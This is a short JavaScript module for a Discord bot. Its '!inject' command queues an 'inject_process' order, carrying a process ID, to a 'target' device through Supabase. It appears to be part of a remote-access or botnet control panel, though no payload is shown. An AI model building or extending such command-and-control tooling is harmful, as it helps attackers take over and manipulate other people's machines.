import { sendCommand, commandSentEmbed, errorEmbed } from './_utils.js'

export const name = 'inject'

export async function execute(message, args, { supabase, getTarget }) {
  const deviceId = getTarget(message.guild.id, message.author.id)
  if (!deviceId) {
    return message.reply({ embeds: [errorEmbed('No active target. Use !target first.')] })
  }

  const pid = parseInt(args[0], 10)
  if (isNaN(pid)) {
    return message.reply('❌ Usage: `!inject <pid>`')
  }

  await message.channel.sendTyping()
  const cmd = await sendCommand(supabase, deviceId, 'inject_process', { pid })
  if (!cmd) return message.reply('❌ Failed.')
  await message.reply({ embeds: [commandSentEmbed(deviceId, `inject PID ${pid}`, cmd.id)] })
}
